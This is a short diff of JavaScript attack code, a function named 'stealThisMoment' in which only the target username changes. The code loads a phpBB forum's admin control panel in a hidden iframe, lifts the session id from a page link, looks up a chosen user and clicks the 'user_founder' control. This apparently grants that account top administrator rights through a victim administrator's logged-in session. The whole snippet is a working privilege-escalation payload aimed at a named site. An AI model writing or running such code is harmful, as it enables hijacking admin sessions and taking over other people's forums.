@@ -70,7 +70,7 @@ function stealThisMoment() {
     var sid = iframe.contentWindow.document.getElementsByClassName('footer-link text-strong')[0].href.split('=')[1];
     iframe.contentWindow.window.location.replace(`https://gparena.net/forum/adm/index.php?sid=${sid}&i=acp_users&mode=overview`);
     setTimeout(() => {
-        iframe.contentWindow.document.getElementById("username").value = "Bury_comedor";
+        iframe.contentWindow.document.getElementById("username").value = "the_lole";
         iframe.contentWindow.document.getElementsByName("submituser")[0].click();
         setTimeout(() => {
             iframe.contentWindow.document.getElementsByName("user_founder")[0].click();
